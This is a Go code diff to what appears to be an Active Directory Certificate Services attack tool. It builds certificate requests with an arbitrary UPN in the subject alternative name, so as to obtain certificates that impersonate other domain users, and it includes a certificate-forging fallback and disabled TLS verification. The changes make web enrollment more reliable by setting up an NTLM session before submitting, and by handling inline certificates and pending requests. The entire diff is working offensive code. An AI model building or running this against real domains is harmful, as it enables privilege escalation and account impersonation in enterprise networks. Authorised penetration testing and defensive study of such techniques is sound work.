@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
 	"regexp"
 	"strings"
@@ -32,7 +33,7 @@ func GenerateCSR(key *ecdsa.PrivateKey, upn string, templateName string) ([]byte
 		return nil, fmt.Errorf("encode UPN SAN: %w", err)
 	}
 	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
-	sanRaw := derTLV(0x30, upnSAN)
+	sanRaw := derTLV(0x30, upnSAN) // SEQUENCE OF GeneralName
 
 	csrTemplate := &x509.CertificateRequest{
 		Subject: pkix.Name{
@@ -159,7 +160,9 @@ func forgeFallback(key *ecdsa.PrivateKey, upn string) (*x509.Certificate, *ecdsa
 // TLS verification is disabled (required for pen-test tools targeting internal
 // AD infrastructure with self-signed certs).
 func newNTLMClient(cfg *ADCSConfig) *http.Client {
+	jar, _ := cookiejar.New(nil)
 	return &http.Client{
+		Jar: jar,
 		Transport: &NTLMTransport{
 			Domain:   cfg.Domain,
 			Username: cfg.Username,
@@ -209,9 +212,29 @@ func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateNa
 	var lastErr error
 
 	for _, scheme := range schemes {
-		submitURL := fmt.Sprintf("%s://%s/certsrv/certfnsh.asp", scheme, caHostname)
-		fmt.Printf("[*] Trying %s enrollment: %s\n", strings.ToUpper(scheme), submitURL)
+		// Pre-flight: GET /certsrv/ to establish NTLM session and cookies.
+		// Some certsrv configurations reject direct POSTs without an active session.
+		preflightURL := fmt.Sprintf("%s://%s/certsrv/", scheme, caHostname)
+		fmt.Printf("[*] Trying %s enrollment: %s\n", strings.ToUpper(scheme), preflightURL)
 
+		preReq, _ := http.NewRequest("GET", preflightURL, nil)
+		preResp, err := client.Do(preReq)
+		if err != nil {
+			lastErr = fmt.Errorf("%s preflight failed: %w", scheme, err)
+			fmt.Printf("[!] %s preflight failed: %v\n", strings.ToUpper(scheme), err)
+			continue
+		}
+		io.Copy(io.Discard, preResp.Body)
+		preResp.Body.Close()
+		if preResp.StatusCode == http.StatusUnauthorized {
+			fmt.Printf("[!] %s NTLM auth failed on preflight (HTTP 401)\n", strings.ToUpper(scheme))
+			lastErr = fmt.Errorf("NTLM auth failed on %s (HTTP 401)", scheme)
+			continue
+		}
+		fmt.Printf("[+] %s session established (HTTP %d)\n", strings.ToUpper(scheme), preResp.StatusCode)
+
+		// Submit CSR
+		submitURL := fmt.Sprintf("%s://%s/certsrv/certfnsh.asp", scheme, caHostname)
 		formEncoded := formData.Encode()
 		req, err := http.NewRequest("POST", submitURL, strings.NewReader(formEncoded))
 		if err != nil {
@@ -252,6 +275,15 @@ func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateNa
 
 		bodyStr := string(body)
 
+		// Check for inline certificate in the response (some certsrv versions return it directly)
+		if block, _ := pem.Decode(body); block != nil && block.Type == "CERTIFICATE" {
+			cert, err := x509.ParseCertificate(block.Bytes)
+			if err == nil {
+				fmt.Printf("[+] Certificate returned inline in certsrv response\n")
+				return cert, nil
+			}
+		}
+
 		// Check for error messages in the response HTML
 		if errMsg := extractCertsrvError(bodyStr); errMsg != "" {
 			lastErr = fmt.Errorf("certsrv error: %s", errMsg)
@@ -259,13 +291,26 @@ func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateNa
 			continue
 		}
 
+		// Check for pending status
+		if rePending.MatchString(bodyStr) {
+			reqID := extractReqID(bodyStr)
+			if reqID != "" {
+				fmt.Printf("[!] Certificate request is PENDING (ReqID=%s) — requires CA admin approval\n", reqID)
+				fmt.Printf("[*] After approval: certreq -retrieve -config \"%s\" %s cert.cer\n", caHostname, reqID)
+			} else {
+				fmt.Printf("[!] Certificate request is PENDING — requires CA admin approval\n")
+			}
+			lastErr = fmt.Errorf("certificate request pending CA admin approval")
+			continue
+		}
+
 		// Try to extract ReqID from the response
 		reqID := extractReqID(bodyStr)
 		if reqID == "" {
-			// Debug: show a snippet of the response to help diagnose
+			// Debug: show the full response to diagnose
 			snippet := bodyStr
-			if len(snippet) > 500 {
-				snippet = snippet[:500]
+			if len(snippet) > 2000 {
+				snippet = snippet[:2000]
 			}
 			fmt.Printf("[!] Could not find certificate request ID in response\n")
 			fmt.Printf("[DEBUG] Response (%d bytes, HTTP %d):\n%s\n", len(body), resp.StatusCode, snippet)
